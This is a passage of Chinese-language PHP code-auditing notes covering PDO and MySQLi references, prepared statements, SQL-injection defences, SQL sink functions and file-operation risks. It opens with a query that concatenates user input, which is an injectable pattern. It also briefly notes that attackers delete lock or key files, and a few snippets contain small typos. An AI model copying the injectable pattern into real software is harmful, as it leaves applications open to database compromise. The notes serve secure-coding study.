$<span style="color: #a0522d;">input_data</span>=1; // &#20551;&#35774;input_dta &#20026;&#29992;&#25143;&#36755;&#20837;&#25968;&#25454;
$<span style="color: #a0522d;">smt</span> = $<span style="color: #a0522d;">pdo</span>-&gt;query(<span style="color: #8b2252;">'SELECT * FROM t_user WHERE id='</span>.$<span style="color: #a0522d;">input_dta</span>);
$<span style="color: #a0522d;">data</span> = $<span style="color: #a0522d;">smt</span>-&gt;fetchAll(PDO::FETCH_ASSOC);
<span style="color: #0000ff;">var_dump</span>($<span style="color: #a0522d;">data</span>);
?&gt;
</pre>
</div>

<p>
PDO 类：
<a href="https://www.runoob.com/php/pdo-begintransaction.html">PDO::beginTransaction</a> — 启动一个事务
<a href="https://www.runoob.com/php/pdo-commit.html">PDO::commit</a> — 提交一个事务
<a href="https://www.runoob.com/php/pdo-construct.html">PDO::__construct</a> — 创建一个表示数据库连接的 PDO 实例
<a href="https://www.runoob.com/php/pdo-errorcode.html">PDO::errorCode</a> — 获取跟数据库句柄上一次操作相关的 SQLSTATE
<a href="https://www.runoob.com/php/pdo-errorinfo.html">PDO::errorInfo</a> — 返回最后一次操作数据库的错误信息
<a href="https://www.runoob.com/php/pdo-exec.html">PDO::exec</a> — <b>执行一条 SQL 语句，并返回受影响的行数</b>
<a href="https://www.runoob.com/php/pdo-getattribute.html">PDO::getAttribute</a> — 取回一个数据库连接的属性
<a href="https://www.runoob.com/php/pdo-getavailabledrivers.html">PDO::getAvailableDrivers</a> — 返回一个可用驱动的数组
<a href="https://www.runoob.com/php/pdo-intransaction.html">PDO::inTransaction</a> — 检查是否在一个事务内
<a href="https://www.runoob.com/php/pdo-lastinsertid.html">PDO::lastInsertId</a> — 返回最后插入行的ID或序列值
<a href="https://www.runoob.com/php/pdo-prepare.html">PDO::prepare</a> — <b>备要执行的SQL语句并返回一个 PDOStatement 对象</b>
<a href="https://www.runoob.com/php/pdo-query.html">PDO::query</a> — <b>执行 SQL 语句，返回PDOStatement对象,可以理解为结果集</b>
<a href="https://www.runoob.com/php/pdo-quote.html">PDO::quote</a> — <b>为SQL语句中的字符串添加引号。</b>
<a href="https://www.runoob.com/php/pdo-rollback.html">PDO::rollBack</a> — 回滚一个事务
<a href="https://www.runoob.com/php/pdo-setattribute.html">PDO::setAttribute</a> — 设置属性
</p>

<p>
PDOStatement 类：
<a href="https://www.runoob.com/php/pdostatement-bindcolumn.html">PDOStatement::bindColumn</a> — <b>绑定一列到一个 PHP 变量</b>
<a href="https://www.runoob.com/php/pdostatement-bindparam.html">PDOStatement::bindParam</a> — <b>绑定一个参数到指定的变量名</b>
<a href="https://www.runoob.com/php/pdostatement-bindvalue.html">PDOStatement::bindValue</a> — <b>把一个值绑定到一个参数</b>
<a href="https://www.runoob.com/php/pdostatement-closecursor.html">PDOStatement::closeCursor</a> — 关闭游标，使语句能再次被执行。
<a href="https://www.runoob.com/php/pdostatement-columncount.html">PDOStatement::columnCount</a> — 返回结果集中的列数
<a href="https://www.runoob.com/php/pdostatement-debugdumpparams.html">PDOStatement::debugDumpParams</a> — 打印一条 SQL 预处理命令
<a href="https://www.runoob.com/php/pdostatement-errorcode.html">PDOStatement::errorCode</a> — 获取跟上一次语句句柄操作相关的 SQLSTATE
<a href="https://www.runoob.com/php/pdostatement-errorinfo.html">PDOStatement::errorInfo</a> — 获取跟上一次语句句柄操作相关的扩展错误信息
<a href="https://www.runoob.com/php/pdostatement-execute.html">PDOStatement::execute</a> — <b>执行一条预处理语句</b>
<a href="https://www.runoob.com/php/pdostatement-fetch.html">PDOStatement::fetch</a> — 从结果集中获取下一行
<a href="https://www.runoob.com/php/pdostatement-fetchall.html">PDOStatement::fetchAll</a> — 返回一个包含结果集中所有行的数组
<a href="https://www.runoob.com/php/pdostatement-fetchcolumn.html">PDOStatement::fetchColumn</a> — 从结果集中的下一行返回单独的一列。
<a href="https://www.runoob.com/php/pdostatement-fetchobject.html">PDOStatement::fetchObject</a> — 获取下一行并作为一个对象返回。
<a href="https://www.runoob.com/php/pdostatement-getattribute.html">PDOStatement::getAttribute</a> — 检索一个语句属性
<a href="https://www.runoob.com/php/pdostatement-getcolumnmeta.html">PDOStatement::getColumnMeta</a> — 返回结果集中一列的元数据
<a href="https://www.runoob.com/php/pdostatement-nextrowset.html">PDOStatement::nextRowset</a> — 在一个多行集语句句柄中推进到下一个行集
<a href="https://www.runoob.com/php/pdostatement-rowcount.html">PDOStatement::rowCount</a> — 返回受上一个 SQL 语句影响的行数
<a href="https://www.runoob.com/php/pdostatement-setattribute.html">PDOStatement::setAttribute</a> — 设置一个语句属性
<a href="https://www.runoob.com/php/pdostatement-setfetchmode.html">PDOStatement::setFetchMode</a> — 为语句设置默认的获取模式。
</p>

<p>
pdo参考：<a href="https://www.php.net/manual/zh/book.pdo.php">https://www.php.net/manual/zh/book.pdo.php</a>
</p>
</div>
</div>
<div id="outline-container-h:d0b769d2-6f76-41f4-9ae7-a7ee40507bc1" class="outline-4">
<h4 id="h:d0b769d2-6f76-41f4-9ae7-a7ee40507bc1">PHP PDO 预处理语句与存储过程</h4>
<div class="outline-text-4" id="text-h:d0b769d2-6f76-41f4-9ae7-a7ee40507bc1">
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
// insert
$<span style="color: #a0522d;">stmt</span> = $<span style="color: #a0522d;">dbh</span>-&gt;prepare(<span style="color: #8b2252;">"INSERT INTO REGISTRY (name, value) VALUES (:name, :value)"</span>);
$<span style="color: #a0522d;">stmt</span>-&gt;bindParam(<span style="color: #8b2252;">':name'</span>, $<span style="color: #a0522d;">name</span>);
$<span style="color: #a0522d;">stmt</span>-&gt;bindParam(<span style="color: #8b2252;">':value'</span>, $<span style="color: #a0522d;">value</span>);

// &#25554;&#20837;&#19968;&#34892;
$<span style="color: #a0522d;">name</span> = <span style="color: #8b2252;">'one'</span>;
$<span style="color: #a0522d;">value</span> = 1;
$<span style="color: #a0522d;">stmt</span>-&gt;execute();

// select
$<span style="color: #a0522d;">stmt</span> = $<span style="color: #a0522d;">dbh</span>-&gt;prepare(<span style="color: #8b2252;">"SELECT * FROM REGISTRY where name = ?"</span>);
<span style="color: #a020f0;">if</span> ($<span style="color: #a0522d;">stmt</span>-&gt;execute(array($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'name'</span>]))) {
  <span style="color: #a020f0;">while</span> ($<span style="color: #a0522d;">row</span> = $<span style="color: #a0522d;">stmt</span>-&gt;fetch()) {
    print_r($<span style="color: #a0522d;">row</span>);
  }
}
?&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:53436876-b484-4a09-96ad-0d2c1285720a" class="outline-4">
<h4 id="h:53436876-b484-4a09-96ad-0d2c1285720a">使用命名（:name）参数来准备SQL语句</h4>
<div class="outline-text-4" id="text-h:53436876-b484-4a09-96ad-0d2c1285720a">
<p>
实例
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
/* &#36890;&#36807;&#25968;&#32452;&#20540;&#21521;&#39044;&#22788;&#29702;&#35821;&#21477;&#20256;&#36882;&#20540; */
$<span style="color: #a0522d;">sql</span> = <span style="color: #8b2252;">'SELECT name, colour, calories</span>
<span style="color: #8b2252;">    FROM fruit</span>
<span style="color: #8b2252;">    WHERE calories &lt; :calories AND colour = :colour'</span>;
$<span style="color: #a0522d;">sth</span> = $<span style="color: #a0522d;">dbh</span>-&gt;prepare($<span style="color: #a0522d;">sql</span>, array(PDO::ATTR_CURSOR =&gt; PDO::CURSOR_FWDONLY));
$<span style="color: #a0522d;">sth</span>-&gt;execute(array(<span style="color: #8b2252;">':calories'</span> =&gt; 150, <span style="color: #8b2252;">':colour'</span> =&gt; <span style="color: #8b2252;">'red'</span>));
$<span style="color: #a0522d;">red</span> = $<span style="color: #a0522d;">sth</span>-&gt;fetchAll();
$<span style="color: #a0522d;">sth</span>-&gt;execute(array(<span style="color: #8b2252;">':calories'</span> =&gt; 175, <span style="color: #8b2252;">':colour'</span> =&gt; <span style="color: #8b2252;">'yellow'</span>));
$<span style="color: #a0522d;">yellow</span> = $<span style="color: #a0522d;">sth</span>-&gt;fetchAll();
?&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:1a90f8e2-d3c1-422c-8531-3093579fba81" class="outline-4">
<h4 id="h:1a90f8e2-d3c1-422c-8531-3093579fba81">使用问号（?）参数来准备SQL语句</h4>
<div class="outline-text-4" id="text-h:1a90f8e2-d3c1-422c-8531-3093579fba81">
<p>
实例
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
/* &#36890;&#36807;&#25968;&#32452;&#20540;&#21521;&#39044;&#22788;&#29702;&#35821;&#21477;&#20256;&#36882;&#20540; */
$<span style="color: #a0522d;">sth</span> = $<span style="color: #a0522d;">dbh</span>-&gt;prepare(<span style="color: #8b2252;">'SELECT name, colour, calories</span>
<span style="color: #8b2252;">    FROM fruit</span>
<span style="color: #8b2252;">    WHERE calories &lt; ? AND colour = ?'</span>);
$<span style="color: #a0522d;">sth</span>-&gt;execute(array(150, <span style="color: #8b2252;">'red'</span>));
$<span style="color: #a0522d;">red</span> = $<span style="color: #a0522d;">sth</span>-&gt;fetchAll();
$<span style="color: #a0522d;">sth</span>-&gt;execute(array(175, <span style="color: #8b2252;">'yellow'</span>));
$<span style="color: #a0522d;">yellow</span> = $<span style="color: #a0522d;">sth</span>-&gt;fetchAll();
?&gt;
</pre>
</div>

<p>
Order by涉及到动态表名和列名时，不能用参数绑定方式处理，如果强制绑定，会没有排序效果，如Order by age。建议使用白名单参数形式：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">orders</span>=array(<span style="color: #8b2252;">"name"</span>,<span style="color: #8b2252;">"age"</span>,<span style="color: #8b2252;">"xxx"</span>);
$<span style="color: #a0522d;">key</span>=array_search($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'data'</span>],$<span style="color: #a0522d;">orders</span>); // &#26597;&#35810;&#26159;&#21542;&#23384;&#22312;&#22312;&#25968;&#32452;&#20013;
$<span style="color: #a0522d;">order</span>=$<span style="color: #a0522d;">orders</span>[$<span style="color: #a0522d;">key</span>];
$<span style="color: #a0522d;">query</span>=<span style="color: #8b2252;">"SELECT * from table WHERE is_live = :is_live ORDER BY $order"</span>;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:84feef37-1de6-46c5-a551-c75ee0c71e2f" class="outline-4">
<h4 id="h:84feef37-1de6-46c5-a551-c75ee0c71e2f">MySQLi 函数</h4>
<div class="outline-text-4" id="text-h:84feef37-1de6-46c5-a551-c75ee0c71e2f">
<p>
参考： <a href="https://www.php.net/manual/zh/book.mysqli.php">https://www.php.net/manual/zh/book.mysqli.php</a>
</p>

<p>
函数 描述
<a href="https://www.runoob.com/php/func-mysqli-affected-rows.html">mysqli_affected_rows()</a> 返回前一次 MySQL 操作所影响的记录行数。
<a href="https://www.runoob.com/php/func-mysqli-autocommit.html">mysqli_autocommit()</a> 打开或关闭自动提交数据库修改。
mysqli_change_user() 更改指定数据库连接的用户。
<a href="https://www.runoob.com/php/func-mysqli-change-user.html">mysqli_character_set_name()</a> 返回数据库连接的默认字符集。
<a href="https://www.runoob.com/php/func-mysqli-close.html">mysqli_close()</a> 关闭先前打开的数据库连接。
<a href="https://www.runoob.com/php/func-mysqli-commit.html">mysqli_commit()</a> 提交当前事务。
<a href="https://www.runoob.com/php/func-mysqli-connect-errno.html">mysqli_connect_errno()</a> 返回上一次连接错误的错误代码。
<a href="https://www.runoob.com/php/func-mysqli-connect-error.html">mysqli_connect_error()</a> 返回上一次连接错误的错误描述。
<a href="https://www.runoob.com/php/func-mysqli-connect.html">mysqli_connect()</a> <b>打开一个到 MySQL 服务器的新的连接。</b>
<a href="https://www.runoob.com/php/func-mysqli-data-seek.html">mysqli_data_seek()</a> 调整结果指针到结果集中的一个任意行。
<a href="https://www.runoob.com/php/func-mysqli-debug.html">mysqli_debug()</a> 执行调试操作。
<a href="https://www.runoob.com/php/func-mysqli-dump-debug-info.html">mysqli_dump_debug_info()</a> 转储调试信息到日志中。
<a href="https://www.runoob.com/php/func-mysqli-errno.html">mysqli_errno()</a> 返回最近调用函数的最后一个错误代码。
<a href="https://www.runoob.com/php/func-mysqli-error-list.html">mysqli_error_list()</a> 返回最近调用函数的错误列表。
<a href="https://www.runoob.com/php/func-mysqli-error.html">mysqli_error()</a> 返回最近调用函数的最后一个错误描述。
<a href="https://www.runoob.com/php/func-mysqli-fetch-all.html">mysqli_fetch_all()</a> 从结果集中取得所有行作为关联数组，或数字数组，或二者兼有。
<a href="https://www.runoob.com/php/func-mysqli-fetch-array.html">mysqli_fetch_array()</a> 从结果集中取得一行作为关联数组，或数字数组，或二者兼有。
<a href="https://www.runoob.com/php/func-mysqli-fetch-assoc.html">mysqli_fetch_assoc()</a> 从结果集中取得一行作为关联数组。
<a href="https://www.runoob.com/php/func-mysqli-fetch-field-direct.html">mysqli_fetch_field_direct()</a> 从结果集中取得某个单一字段的 meta-data，并作为对象返回。
<a href="https://www.runoob.com/php/func-mysqli-fetch-field.html">mysqli_fetch_field()</a> 从结果集中取得下一字段，并作为对象返回。
<a href="https://www.runoob.com/php/func-mysqli-fetch-fields.html">mysqli_fetch_fields()</a> 返回结果中代表字段的对象的数组。
<a href="https://www.runoob.com/php/func-mysqli-fetch-lengths.html">mysqli_fetch_lengths()</a> 返回结果集中当前行的每个列的长度。
<a href="https://www.runoob.com/php/func-mysqli-fetch-object.html">mysqli_fetch_object()</a> 从结果集中取得当前行，并作为对象返回。
<a href="https://www.runoob.com/php/func-mysqli-fetch-row.html">mysqli_fetch_row()</a> 从结果集中取得一行，并作为枚举数组返回。
<a href="https://www.runoob.com/php/func-mysqli-field-count.html">mysqli_field_count()</a> 返回最近查询的列数。
<a href="https://www.runoob.com/php/func-mysqli-field-seek.html">mysqli_field_seek()</a> 把结果集中的指针设置为指定字段的偏移量。
<a href="https://www.runoob.com/php/func-mysqli-field-tell.html">mysqli_field_tell()</a> 返回结果集中的指针的位置。
<a href="https://www.runoob.com/php/func-mysqli-free-result.html">mysqli_free_result()</a> 释放结果内存。
<a href="https://www.runoob.com/php/func-mysqli-get-charset.html">mysqli_get_charset()</a> 返回字符集对象。
<a href="https://www.runoob.com/php/func-mysqli-get-client-info.html">mysqli_get_client_info()</a> 返回 MySQL 客户端库版本。
<a href="https://www.runoob.com/php/func-mysqli-get-client-stats.html">mysqli_get_client_stats()</a> 返回有关客户端每个进程的统计。
<a href="https://www.runoob.com/php/func-mysqli-get-client-version.html">mysqli_get_client_version()</a> 将 MySQL 客户端库版本作为整数返回。
<a href="https://www.runoob.com/php/func-mysqli-get-connection-stats.html">mysqli_get_connection_stats()</a> 返回有关客户端连接的统计。
<a href="https://www.runoob.com/php/func-mysqli-get-host-info.html">mysqli_get_host_info()</a> 返回 MySQL 服务器主机名和连接类型。
<a href="https://www.runoob.com/php/func-mysqli-get-proto-info.html">mysqli_get_proto_info()</a> 返回 MySQL 协议版本。
<a href="https://www.runoob.com/php/func-mysqli-get-server-info.html">mysqli_get_server_info()</a> 返回 MySQL 服务器版本。
<a href="https://www.runoob.com/php/func-mysqli-get-server-version.html">mysqli_get_server_version()</a> 将 MySQL 服务器版本作为整数返回。
<a href="https://www.runoob.com/php/func-mysqli-info.html">mysqli_info()</a> 返回有关最近执行查询的信息。
<a href="https://www.runoob.com/php/func-mysqli-init.html">mysqli_init()</a> 初始化 MySQLi 并返回 mysqli_real_connect() 使用的资源。
<a href="https://www.runoob.com/php/func-mysqli-insert-id.html">mysqli_insert_id()</a> 返回最后一个查询中自动生成的 ID。
<a href="https://www.runoob.com/php/func-mysqli-kill.html">mysql_kill()</a> 请求服务器杀死一个 MySQL 线程。
<a href="https://www.runoob.com/php/func-mysqli-more-results.html">mysqli_more_results()</a> 检查一个多查询是否有更多的结果。
<a href="https://www.runoob.com/php/func-mysqli-multi-query.html">mysqli_multi_query()</a> 执行一个或多个针对数据库的查询。
<a href="https://www.runoob.com/php/func-mysqli-next-result.html">mysqli_next_result()</a> 为 mysqli_multi_query() 准备下一个结果集。
<a href="https://www.runoob.com/php/func-mysqli-multi-query.html">mysqli_num_fields()</a> 返回结果集中字段的数量。
<a href="https://www.runoob.com/php/func-mysqli-num-rows.html">mysqli_num_rows()</a> 返回结果集中行的数量。
<a href="https://www.runoob.com/php/func-mysqli-options.html">mysqli_options()</a> 设置额外的连接选项，用于影响连接行为。
<a href="https://www.runoob.com/php/func-mysqli-ping.html">mysqli_ping()</a> 进行一个服务器连接，如果连接已断开则尝试重新连接。
mysqli_prepare() <b>准备执行一个 SQL 语句</b>
<a href="https://www.runoob.com/php/func-mysqli-query.html">mysqli_query()</a> <b>执行某个针对数据库的查询。</b>
<a href="https://www.runoob.com/php/func-mysqli-real-connect.html">mysqli_real_connect()</a> 打开一个到 MySQL 服务器的新的链接。
<a href="https://www.runoob.com/php/func-mysqli-real-escape-string.html">mysqli_real_escape_string()</a> 转义在 SQL 语句中使用的字符串中的特殊字符。
mysqli_real_query() <b>执行 SQL 查询</b>
mysqli_reap_async_query() 返回异步查询的结果。
<a href="https://www.runoob.com/php/func-mysqli-refresh.html">mysqli_refresh()</a> 刷新表或缓存，或者重置复制服务器信息。
<a href="https://www.runoob.com/php/func-mysqli-rollback.html">mysqli_rollback()</a> 回滚数据库中的当前事务。
<a href="https://www.runoob.com/php/func-mysqli-select-db.html">mysqli_select_db()</a> 更改连接的默认数据库。
<a href="https://www.runoob.com/php/func-mysqli-set-charset.html">mysqli_set_charset()</a> 设置默认客户端字符集。
mysqli_set_local_infile_default() 撤销用于 load local infile 命令的用户自定义句柄。
mysqli_set_local_infile_handler() 设置用于 LOAD DATA LOCAL INFILE 命令的回滚函数。
<a href="https://www.runoob.com/php/func-mysqli-sqlstate.html">mysqli_sqlstate()</a> 返回最后一个 MySQL 操作的 SQLSTATE 错误代码。
<a href="https://www.runoob.com/php/func-mysqli-ssl-set.html">mysqli_ssl_set()</a> 用于创建 SSL 安全连接。
<a href="https://www.runoob.com/php/func-mysqli-stat.html">mysqli_stat()</a> 返回当前系统状态。
<a href="https://www.runoob.com/php/func-mysqli-stmt-init.html">mysqli_stmt_init()</a> 初始化声明并返回 mysqli_stmt_prepare() 使用的对象。
mysqli_store_result() 返回的当前的结果集。
<a href="https://www.runoob.com/php/func-mysqli-thread-id.html">mysqli_thread_id()</a> 返回当前连接的线程 ID。
<a href="https://www.runoob.com/php/func-mysqli-thread-safe.html">mysqli_thread_safe()</a> 返回是否将客户端库编译成 thread-safe。
mysqli_use_result() 从上次使用 mysqli_real_query() 执行的查询中初始化结果集的检索。
mysqli_warning_count() 返回连接中的最后一个查询的警告数量。
</p>

<p>
执行原生sql代码示例:
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
// &#20551;&#23450;&#25968;&#25454;&#24211;&#29992;&#25143;&#21517;&#65306;root&#65292;&#23494;&#30721;&#65306;123456&#65292;&#25968;&#25454;&#24211;&#65306;RUNOOB
$<span style="color: #a0522d;">con</span>=mysqli_connect(<span style="color: #8b2252;">"localhost"</span>,<span style="color: #8b2252;">"root"</span>,<span style="color: #8b2252;">"123456"</span>,<span style="color: #8b2252;">"RUNOOB"</span>);
<span style="color: #a020f0;">if</span> (mysqli_connect_errno($<span style="color: #a0522d;">con</span>))
{
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&#36830;&#25509; MySQL &#22833;&#36133;: "</span> . mysqli_connect_error();
}
// &#25191;&#34892;&#26597;&#35810;
<span style="color: #0000ff;">mysqli_query</span>($<span style="color: #a0522d;">con</span>,<span style="color: #8b2252;">"SELECT * FROM websites"</span>);
<span style="color: #0000ff;">mysqli_query</span>($<span style="color: #a0522d;">con</span>,<span style="color: #8b2252;">"INSERT INTO websites (name, url, alexa, country)</span>
<span style="color: #8b2252;">VALUES ('&#30334;&#24230;','https://www.baidu.com/','4','CN')"</span>);

<span style="color: #0000ff;">mysqli_close</span>($<span style="color: #a0522d;">con</span>);
?&gt;
</pre>
</div>

<p>
预编译sql代码示例:
预编译三个步骤为：1.$stmt -&gt; prepare. 2.$stmt -&gt; bind_param. 3.$stmt -&gt; execute
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #0000ff;">mysqli_report</span>(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
$<span style="color: #a0522d;">mysqli</span> = new mysqli(<span style="color: #8b2252;">"localhost"</span>, <span style="color: #8b2252;">"my_user"</span>, <span style="color: #8b2252;">"my_password"</span>, <span style="color: #8b2252;">"world"</span>);

$<span style="color: #a0522d;">city</span> = <span style="color: #8b2252;">"Amersfoort"</span>;

/* create a prepared statement */
$<span style="color: #a0522d;">stmt</span> = $<span style="color: #a0522d;">mysqli</span>-&gt;prepare(<span style="color: #8b2252;">"SELECT District FROM City WHERE Name=?"</span>);

/* bind parameters for markers */
$<span style="color: #a0522d;">stmt</span>-&gt;bind_param(<span style="color: #8b2252;">"s"</span>, $<span style="color: #a0522d;">city</span>);

/* execute query */
$<span style="color: #a0522d;">stmt</span>-&gt;execute();

/* bind result variables */
$<span style="color: #a0522d;">stmt</span>-&gt;bind_result($<span style="color: #a0522d;">district</span>);

/* fetch value */
$<span style="color: #a0522d;">stmt</span>-&gt;fetch();

<span style="color: #483d8b;">printf</span>(<span style="color: #8b2252;">"%s is in district %s\n"</span>, $<span style="color: #a0522d;">city</span>, $<span style="color: #a0522d;">district</span>);
</pre>
</div>
</div>
</div>
<div id="outline-container-h:9152a171-949d-4872-867b-c16faebe2805" class="outline-4">
<h4 id="h:9152a171-949d-4872-867b-c16faebe2805">mysql 扩展</h4>
<div class="outline-text-4" id="text-h:9152a171-949d-4872-867b-c16faebe2805">
<p>
mysql扩展没有预编译机制，容易存在sql注入
</p>

<p>
mysql 扩展参考： <a href="https://www.php.net/manual/zh/book.mysql.php">https://www.php.net/manual/zh/book.mysql.php</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
$<span style="color: #a0522d;">con</span> = mysql_connect(<span style="color: #8b2252;">"localhost"</span>,<span style="color: #8b2252;">"peter"</span>,<span style="color: #8b2252;">"abc123"</span>);
<span style="color: #a020f0;">if</span> (!$<span style="color: #a0522d;">con</span>)
{
  die(<span style="color: #8b2252;">'Could not connect: '</span> . mysql_error());
}

<span style="color: #0000ff;">mysql_select_db</span>(<span style="color: #8b2252;">"my_db"</span>, $<span style="color: #a0522d;">con</span>);
$<span style="color: #a0522d;">result</span> = mysql_query(<span style="color: #8b2252;">"SELECT * FROM Persons"</span>);
<span style="color: #a020f0;">while</span>($<span style="color: #a0522d;">row</span> = mysql_fetch_array($<span style="color: #a0522d;">result</span>))
{
  <span style="color: #483d8b;">echo</span> $<span style="color: #a0522d;">row</span>[<span style="color: #8b2252;">'FirstName'</span>] . <span style="color: #8b2252;">" "</span> . $<span style="color: #a0522d;">row</span>[<span style="color: #8b2252;">'LastName'</span>];
  <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;br /&gt;"</span>;
}

<span style="color: #0000ff;">mysql_close</span>($<span style="color: #a0522d;">con</span>);
?&gt;
</pre>
</div>

<p>
常见过滤/防护
</p>
<div class="org-src-container">
<pre class="src src-sh">addslashes &#22312;&#21333;&#24341;&#21495;&#65288;<span style="color: #8b2252;">'&#65289;&#12289;&#21452;&#24341;&#21495;&#65288;"&#65289;&#12289;&#21453;&#26012;&#32447;&#65288;\&#65289;&#19982; NULL &#21069;&#21152;&#19978;&#21453;&#26012;&#32447; &#21487;&#29992;&#20110;&#38450;&#27490;SQL&#27880;&#20837;</span>
</pre>
</div>
</div>
<div id="outline-container-h:f3ddfb55-fa94-45df-94c0-12553e518d22" class="outline-5">
<h5 id="h:f3ddfb55-fa94-45df-94c0-12553e518d22">防护方法</h5>
<div class="outline-text-5" id="text-h:f3ddfb55-fa94-45df-94c0-12553e518d22">
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
/*&#24378;&#21046;&#31867;&#22411;&#36716;&#25442;*/
$<span style="color: #a0522d;">id</span>=intval($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'id'</span>]); //&#22240;&#26597;&#35810;ID&#20026;&#25972;&#25968; &#25152;&#20197;&#21487;&#20197;&#24378;&#21046;&#36716;&#25442;&#20026;&#25972;&#25968;

/*&#36716;&#20041;&#29305;&#27530;&#23383;&#31526; &#21152;&#19978;&#24341;&#21495; (&#23383;&#31526;&#20018;&#31867;&#22411;)*/
$<span style="color: #a0522d;">id</span>=$<span style="color: #a0522d;">pdo</span>-&gt;quote($<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'name'</span>]);

/*&#39044;&#22788;&#29702;&#35821;&#21477;*/
$<span style="color: #a0522d;">stmt</span> =$<span style="color: #a0522d;">pdo</span>-&gt;prepare(<span style="color: #8b2252;">"SELECT id, name FROM users WHERE id=?;"</span>);
$<span style="color: #a0522d;">stmt</span>-&gt;execute([$<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'id'</span>]]);//&#31616;&#21333;&#30340;&#39044;&#22788;&#29702; &#23436;&#25972;&#20351;&#29992;&#26041;&#27861;&#35265;PHP&#25163;&#20876;
?&gt;


PDO::quote &#36716;&#20041;&#29305;&#27530;&#23383;&#31526; &#24182;&#28155;&#21152;&#24341;&#21495;

PDO::prepare &#39044;&#22788;&#29702;SQL&#35821;&#21477; &#26377;&#25928;&#38450;&#27490;SQL&#27880;&#20837; (&#25512;&#33616;) intval($<span style="color: #a0522d;">input</span>) floatval() floatval() floor() (int)$<span style="color: #a0522d;">input</span> num

&#23558;&#36755;&#20837;&#24378;&#21046;&#36716;&#25442;&#20026;&#25972;&#25968;/&#28014;&#28857; &#29992;&#20110;&#25972;&#25968;/&#28014;&#28857;&#31867;&#22411;&#30340;&#36755;&#20837;&#21442;&#25968;&#22788;&#29702; &#21487;&#38450;&#27490;SQL&#27880;&#20837;
</pre>
</div>

<p>
一些执行SQL语句的函数
</p>
<div class="org-src-container">
<pre class="src src-sh">&#20989;&#25968;/&#26041;&#27861; &#22791;&#27880;
mysql_query
odbc_exec
mysqli_query
mysql_db_query
mysql_unbuffered_query
mysqli::query&#29992;&#27861;$<span style="color: #a0522d;">mysqli</span> = new mysqli(<span style="color: #8b2252;">"localhost"</span>, <span style="color: #8b2252;">"my_user"</span>, <span style="color: #8b2252;">"my_password"</span>,<span style="color: #8b2252;">"world"</span>);$<span style="color: #a0522d;">mysqli</span>-&gt;query();
pg_query
pg_query_params
pg_send_query
pg_send_query_params
sqlsrv_query
pdo::query$<span style="color: #a0522d;">pdo</span>=new PDO(<span style="color: #8b2252;">"mysql:host=localhost;dbname=phpdem o"</span>,<span style="color: #8b2252;">"root"</span>,<span style="color: #8b2252;">"1234"</span>); $<span style="color: #a0522d;">pdo</span>-&gt;query($<span style="color: #a0522d;">sql</span>); <span style="color: #b22222;">#</span><span style="color: #b22222;">PDO</span>

SQLite3::query SQLite3::exec$<span style="color: #a0522d;">db</span> = new SQLite3(<span style="color: #8b2252;">'mysqlitedb.db'</span>); 
$<span style="color: #a0522d;">db</span>-&gt;query(<span style="color: #8b2252;">'SELECT bar FROM foo'</span>); 
$<span style="color: #a0522d;">db</span>-&gt;exec(<span style="color: #8b2252;">'CREATE TABLE bar (bar STRING)'</span>);
</pre>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-h:952f1581-163b-4123-a883-309bded14af2" class="outline-3">
<h3 id="h:952f1581-163b-4123-a883-309bded14af2">文件操作</h3>
<div class="outline-text-3" id="text-h:952f1581-163b-4123-a883-309bded14af2">
<p>
文件操作相关关键参数用户可控 导致文件/目录 删除/移动/写入(上传)/读取等
</p>

<p>
文件/目录删除
1 unlink(文件路径)//删除文件
2 rmdir(文件夹路径)//删除目录
</p>

<p>
攻击者常见用法
</p>
<ul class="org-ul">
<li>删除lock文件(解除重复程序安装保护等安全限制) 删除网站关键文件(导致网站拒绝服务 数据丢失)</li>
</ul>

<p>
文件写入/上传
</p>
<div class="org-src-container">
<pre class="src src-sh">&#25991;&#20214;&#20889;&#20837;
<span style="color: #0000ff;">file_put_contents</span>(&#36335;&#24452;,&#20889;&#20837;&#23383;&#31526;&#20018;);//&#30452;&#25509;&#23558;&#23383;&#31526;&#20018;&#20889;&#20837;&#25991;&#20214;(&#19981;&#23384;&#22312;&#20250;&#33258;&#21160;&#21019;&#24314;) 3
$<span style="color: #a0522d;">fp</span> = fopen(&#25991;&#20214;&#36335;&#24452;, <span style="color: #8b2252;">"w"</span>);//&#20197;&#20889;&#20837;&#27169;&#24335;&#25171;&#24320;&#19968;&#20010;&#25991;&#20214; &#36820;&#22238;&#25991;&#20214;&#25351;&#38024;(&#19981;&#23384;&#22312;&#20250;&#33258;&#21160;&#21019;&#24314;)
<span style="color: #0000ff;">fwrite</span>($<span style="color: #a0522d;">fp</span>,&#20889;&#20837;&#23383;&#31526;&#20018;);//&#20889;&#20837;&#25968;&#25454;
<span style="color: #0000ff;">fclose</span>($<span style="color: #a0522d;">fp</span>);//&#20851;&#38381;&#25991;&#20214;

&#25991;&#20214;&#19978;&#20256;
<span style="color: #0000ff;">move_uploaded_file</span>(&#20020;&#26102;&#19978;&#20256;&#25991;&#20214;&#36335;&#24452;,&#30446;&#26631;&#25991;&#20214;&#36335;&#24452;);//&#31227;&#21160;&#20020;&#26102;&#19978;&#20256;&#25991;&#20214;
</pre>
</div>

<p>
<a href="https://www.php.net/manual/en/features.file-upload.post-method.php">php的原生文件上传</a>
</p>

<ul class="org-ul">
<li>收到POST表单-&gt;随机文件名写入临时目录-&gt;(执行PHP文件处理逻辑-&gt;移动临时文件到保存位置)-&gt;删除临时文件(如果临时文件没有被移动)</li>
